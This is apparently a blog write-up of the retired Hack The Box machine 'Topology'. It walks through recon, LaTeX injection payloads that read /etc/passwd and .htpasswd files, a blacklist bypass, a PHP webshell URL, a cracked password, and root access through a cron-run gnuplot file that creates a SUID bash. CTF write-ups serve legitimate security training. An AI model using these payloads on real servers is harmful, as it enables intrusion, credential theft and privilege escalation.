---
layout: post
title: HTB - Topology
date: 2023-11-04 12:48 +0200
categories: [HTB Machines]
tags: [LaTeX,Gnuplot,Fuff,htpasswd,Vhost,SetUID,Pspy]  
image: /assets/img/hackthebox/machines writeups/Topology/Cover.png
---


## **Summary**

Topology starts with a website for a Math department which conatins multi virtual hosts. LaTeX Vhost used to convert math functions into an images. By performing `Latex injection` to gain arbitrary file read, and get the `.htpassword` file for a dev vhost, which used the same password for the user on the machine. To get the root access, Abusing a cron running `gnuplot` to create file to gain command execution as root.

## **Machine Info**

|                      |                                                                                                  |
|:--------------------:|:------------------------------------------------------------------------------------------------:|
| **Box Name**         |  Topology                                                                                        |
| **OS**               |  ![](/assets/img/hackthebox/machines writeups/Topology/linux_penguin.png){: w="35" h="30" }      |
| **Difficulty**       |  Easy                                                                                            |
| **Graph**            |  ![](/assets/img/hackthebox/machines writeups/Topology/graph.png)                                |
| **Points**           |  20                                                                                              |
| **Release Date**     |  10 Jun 2023                                                                                     |
| **Retire Date**      |  04 Nov 2023                                                                                     |




## **Recon**

### **Nmap**

Using `Nmap` to enumerate all open ports and services by doing this on two phases to speed things up :

- **Phase 1 :** Make a simple scan to check for all opened `TCP` ports with high rate of checking port equel to 10000.
- **Phase 2 :** After idetify the open ports start the sec phase to fingerprint (services, versions, etc) for each open port.


```bash
# Fast scan to check open ports
nmap -p- --min-rate 10000 10.10.11.217 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 18:35 EDT
Nmap scan report for latex.topology.htb (10.10.11.217)
Host is up (0.072s latency).
Not shown: 65525 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
926/tcp   filtered unknown
9857/tcp  filtered unknown
12967/tcp filtered unknown
18629/tcp filtered unknown
28950/tcp filtered unknown
46484/tcp filtered unknown
50558/tcp filtered unknown
58480/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds

# Detailed Scan for spesfic open ports                                                                 
nmap -p 80,22 -sC -A 10.10.11.217
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 18:35 EDT
Nmap scan report for latex.topology.htb (10.10.11.217)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Index of /
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2023-01-17 12:26  demo/
| 1.0K  2023-01-17 12:26  demo/fraction.png
| 1.1K  2023-01-17 12:26  demo/greek.png
| 1.1K  2023-01-17 12:26  demo/sqrt.png
| 1.0K  2023-01-17 12:26  demo/summ.png
| 3.8K  2023-06-12 07:37  equation.php
| 662   2023-01-17 12:26  equationtest.aux
| 17K   2023-01-17 12:26  equationtest.log
| 0     2023-01-17 12:26  equationtest.out
| 28K   2023-01-17 12:26  equationtest.pdf
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.55 seconds

```
{: .nolineno }

`nmap` finds four open TCP ports, **SSH (22)** and **HTTP (80)**


### **HTTP Topology.htb - TCP 80**

The home page of the website is represent a Group of Profs for the Department of Mathematics and their research topics and software projects.

![Home Page](/assets/img/hackthebox/machines writeups/Topology/home-page.png)

You an find the following on the home page :

- The contact email on the page is `lklein@topology.htb` so this is a **potential user** and a **potential virtual hosting**.
- A software project called **LaTeX Equation Generator** is redirect to this virtual host `latex.topology.htb`.

#### **Source Code**

After moving around in the home page and it's source code you can find a **potential users** : 


- **lklein**    - Lilian Klein
- **vdaisley**  - Vajramani Daisley
- **dabrahams** - Derek Abrahams

![](/assets/img/hackthebox/machines writeups/Topology/potential-users.png)

#### **Virtual Hosting Enum**

Using `fuff` to make Virtual hosting bruteforce found 3 differant Virtual hosts :
- stats
- dev
- latex

![Virtual Host Enumeration](/assets/img/hackthebox/machines writeups/Topology/virtualhost-enum.png)


### **HTTP Dev.topology.htb - TCP 80**

The **Dev** one shows a basic auth trying some default creds like `admin:admin` not work.

![Dev Subdomain](/assets/img/hackthebox/machines writeups/Topology/basic-auth.png)


### **HTTP Latex.topology.htb - TCP 80**

It's a simple website used to create a .PNG file using [LaTeX](https://www.latex-project.org/about/).

![Latex Website](/assets/img/hackthebox/machines writeups/Topology/latex-page.png)

#### **LaTeX Injection**

Servers that convert LaTeX code to PDF , Image , etc can be affected by high vuln leads to allow attackers to do the follwoing :
- Read file from the server file system
- Write files to the serverfile system
- OS command execution of the target server. 

In this [post](https://exploit-notes.hdks.org/exploit/web/security-risk/latex-injection/) you can found some cool latex injecton payloads but as you can see that the backend is blacklisted some of the functions which leads to LFI or even RCE as we can see with this example paylaod `\input{/etc/passwd}`

![](/assets/img/hackthebox/machines writeups/Topology/blacklist commands.png)

After trying and error this payload will does the job `$\lstinputlisting{/etc/passwd}$`

![](/assets/img/hackthebox/machines writeups/Topology/etc passwd.png)

looking for users that allowed to get a shell like `/bin/bash`, `/bin/sh`, etc found two users :

- **root** - Default Root user
- **vdaisley** - User which we predict before from the source code enumeration


Assuming that the webapp running using **vdaisley** user so trying to get the **user.txt** file in the **vdaisley** home directory but got nothing so this means the webapp is running with diff user like `www-data`

#### **htpasswd **


Return to **Dev** domain since it's require a basic auth so this is done on apache using `.htaccess` file and `.htpasswd` so trying to dump it's content on the following paths :
 - **/var/www/dev/.htaccess**
 - **/var/www/dev/.htpasswd**


![](/assets/img/hackthebox/machines writeups/Topology/htaccess.png)

![](/assets/img/hackthebox/machines writeups/Topology/htpasswd.png)


## **Shell as vdaisley - Method 1**

If you are lazy person like me 😅 you can go to this [website](https://brandfolder.com/workbench/extract-text-from-image) and upload the hash image to get it as text

![](/assets/img/hackthebox/machines writeups/Topology/hash-string.png)


### **Cracking the hash**

`Hashcat` crack the hash `$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0` to get the vdaisley user password which is `calculus20`

```bash
hashcat vdaisley_user.hash --username /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server
...[snip]...
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20          
...[snip]..
```
{: .nolineno }

### **SSH - TCP 22**

Using `sshpass` to login as `vdaisley` with password `calculus20`


```bash
sshpass -p calculus20 ssh vdaisley@topology.htb

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)

Expanded Security Maintenance for Applications is not enabled.

...[snip]..
```
{: .nolineno }

Grab `user.txt` flag

```bash
cat user.txt
835a57cd************************.
```

## **Shell as vdaisley - Method 2**

Found an exposed dir listing in latex Vhost home page. 

![](/assets/img/hackthebox/machines writeups/Topology/latex_dirlisting.png)

So using the Read file function to read the content of the `equeation.php` content to check the filters which blocks spesfic commands or syntax using this payload `$\lstinputlisting{../equation.php}$`.

![](/assets/img/hackthebox/machines writeups/Topology/equation_php.png)

### **Bypass Blacklist**

According to awesome person [Ippsec](https://ippsec.rocks/) he was reading this [blog](https://sk3rts.rocks/posts/bypassing-latex-filters/) about how to bypassing LaTeX filters where it talks about a bypass using the `\catcode` which unfortunately for my i was already read it but can't apply it 😅 .But in his case he combianed this knowledge with this [page](https://en.wikibooks.org/wiki/TeX/catcode
) to do the following 


> **Exploit Chain** <br />
- It sets the `@` character to represent `superscript` values. <br />
- Then we can use two of them to tell LaTeX to use the `hexdecimal` value that follows after. <br />
- According to this line in the sec post `7 = Superscript, normally ^`. <br />
- He figure out that he may can use this `^^Ascii Code` eg. `^^77` to rpersent `W` char and it work like charm. 
{: .prompt-tip }

As proof of concept i change the `t` char with `^^74` so the new payload will be this `$\lstinpu^^74listing{/etc/passwd}$` and it's working 

![](/assets/img/hackthebox/machines writeups/Topology/filter_bypass.png)

### **RCE**

Creating a simple Webshell 

```plaintext
\newwrite\outfile
\openout\outfile=Webshell.tex
\wrie^^74\outfile{<?php system($_REQUEST['cmd']); ?>}
\closeout\outfile
```

So the final URL will be like the following 

{% raw %}
```plaintext
latex.topology.htb/equation.php?eqn=\newwrite\outfile\openout\outfile=Webshell.php\wri^^74e\outfile{%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E}\closeout\outfile
```
{% endraw %}

![](/assets/img/hackthebox/machines writeups/Topology/webshell1.png)

The shell uploaded to the **tempfiles** dir so we can access it and gain RCE now 

![](/assets/img/hackthebox/machines writeups/Topology/webshell2.png)

## **Shell as Root**

After some enumeration found that the `/opt` dir has interesting folder, but vdaisley user can't view what is inside it but he can write to it 

```bash
ls -ld gnuplot/
drwx-wx-wx 2 root root 4096 Sep  7 18:00 gnuplot/
```
{: .nolineno }

The **gnuplot** is a command-line and GUI program that can generate two- and three-dimentional plots of functions, data, and data fits.


### **Pspy**

Using `Pspy` after downlaod it from my machine to the target box to enum real time running processes


```bash
wget 10.10.16.84/pspy64
--2023-09-25 18:03:02--  http://10.10.16.84/pspy64
Connecting to 10.10.16.84:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                               100%[==================================>]   2.96M  3.02MB/s    in 0.8s    

2023-09-25 18:04:22 (3.67 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

According to the following results it seems that there is a code `find /opt/gnuplot -name *.plt -exec gnuplot {} ;` which searching for any plt files in the **/opt/gnuplot** adn execute it.

```
2023-09-25 18:22:42 CMD: UID=0     PID=2      | 
2023-09-25 18:22:42 CMD: UID=0     PID=1      | /sbin/init 
2023-09-25 18:24:01 CMD: UID=0     PID=99127  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
2023-09-25 18:24:01 CMD: UID=0     PID=99126  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
2023-09-25 18:24:01 CMD: UID=0     PID=99125  | /usr/sbin/CRON -f 
2023-09-25 18:24:01 CMD: UID=0     PID=99124  | /usr/sbin/CRON -f 
2023-09-25 18:24:01 CMD: UID=0     PID=99128  | 
2023-09-25 18:24:01 CMD: UID=0     PID=99134  | gnuplot /opt/gnuplot/loadplot.plt 
2023-09-25 18:24:01 CMD: UID=0     PID=99133  | cut -d   -f3,7 
2023-09-25 18:24:01 CMD: UID=0     PID=99132  | tr -s   
2023-09-25 18:24:01 CMD: UID=0     PID=99131  | grep enp 
2023-09-25 18:24:01 CMD: UID=0     PID=99129  | /bin/sh /opt/gnuplot/getdata.sh 
2023-09-25 18:24:01 CMD: UID=0     PID=99137  | /bin/sh /opt/gnuplot/getdata.sh 
2023-09-25 18:24:01 CMD: UID=0     PID=99136  | /bin/sh /opt/gnuplot/getdata.sh 
2023-09-25 18:24:01 CMD: UID=0     PID=99135  | /bin/sh /opt/gnuplot/getdata.sh 
2023-09-25 18:24:01 CMD: UID=0     PID=99138  | sed s/,//g 
2023-09-25 18:24:01 CMD: UID=0     PID=99139  | 
2023-09-25 18:24:01 CMD: UID=0     PID=99140  | 
2023-09-25 18:24:01 CMD: UID=0     PID=99141  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023-09-25 18:24:01 CMD: UID=0     PID=99144  | gnuplot /opt/gnuplot/networkplot.plt 
2023-09-25 18:25:01 CMD: UID=0     PID=99148  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023-09-25 18:25:01 CMD: UID=0     PID=99147  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
2023-09-25 18:25:01 CMD: UID=0     PID=99146  | /usr/sbin/CRON -f 
2023-09-25 18:25:01 CMD: UID=0     PID=99145  | /usr/sbin/CRON -f 
2023-09-25 18:25:01 CMD: UID=0     PID=99149  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023-09-25 18:25:01 CMD: UID=0     PID=99150  | /usr/sbin/CRON -f 
2023-09-25 18:25:01 CMD: UID=0     PID=99151  | /bin/sh /opt/gnuplot/getdata.sh 
2023-09-25 18:25:01 CMD: UID=0     PID=99155  | /bin/sh /opt/gnuplot/getdata.sh 
2023-09-25 18:25:01 CMD: UID=0     PID=99154  | tr -s   
```

So according to this [post](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/) we can write a new plt file to the /opt/gnuplot and waiting for like 1 min and get command execution as `Root` 

Creating a copy of the `/bin/bash` file with the `SetUID/SetGID` 

```bash
cat > /opt/gnuplot/0xRyuzak1.plt << EOF
> system("cp /bin/bash /tmp/0xRyuzak1")
> system("chmod 6777 /tmp/0xRyuzak1")
> EOF
```

```
2023/11/04 18:41:06 CMD: UID=0     PID=1      | /sbin/init 
2023/11/04 18:42:01 CMD: UID=0     PID=99993  | /usr/sbin/CRON -f 
2023/11/04 18:42:01 CMD: UID=0     PID=99992  | /usr/sbin/CRON -f 
2023/11/04 18:42:01 CMD: UID=0     PID=99996  | /bin/sh -c /opt/gnuplot/getdata.sh 
2023/11/04 18:42:01 CMD: UID=0     PID=99995  | /bin/sh -c /opt/gnuplot/getdata.sh 
2023/11/04 18:42:01 CMD: UID=0     PID=99994  | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \; 
2023/11/04 18:42:01 CMD: UID=0     PID=100002 | gnuplot /opt/gnuplot/loadplot.plt 
2023/11/04 18:42:01 CMD: UID=0     PID=100001 | cut -d   -f3,7 
2023/11/04 18:42:01 CMD: UID=0     PID=100000 | tr -s   
2023/11/04 18:42:01 CMD: UID=0     PID=99999  | /bin/sh /opt/gnuplot/getdata.sh 
2023/11/04 18:42:01 CMD: UID=0     PID=99998  | netstat -i 
2023/11/04 18:42:01 CMD: UID=0     PID=99997  | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 
2023/11/04 18:42:01 CMD: UID=0     PID=100006 | /bin/sh /opt/gnuplot/getdata.sh 
2023/11/04 18:42:01 CMD: UID=0     PID=100005 | cut -d  -f 3 
2023/11/04 18:42:01 CMD: UID=0     PID=100004 | grep -o load average:.*$ 
2023/11/04 18:42:01 CMD: UID=0     PID=100003 | uptime 
2023/11/04 18:42:01 CMD: UID=0     PID=100007 | /bin/sh /opt/gnuplot/getdata.sh 
2023/11/04 18:42:01 CMD: UID=0     PID=100008 | 
2023/11/04 18:42:01 CMD: UID=0     PID=100010 | gnuplot /opt/gnuplot/0xRyuzak1.plt 
2023/11/04 18:42:01 CMD: UID=0     PID=100012 | cp /bin/bash /tmp/0xRyuzak1 
2023/11/04 18:42:01 CMD: UID=0     PID=100011 | sh -c cp /bin/bash /tmp/0xRyuzak1 
2023/11/04 18:42:01 CMD: UID=0     PID=100015 | find /opt/gnuplot -name *.plt -exec gnuplot {} ; 

```

Running the shell with `-p` to not drop down the privs, and get a shell as root user:


![](/assets/img/hackthebox/machines writeups/Topology/root.png)










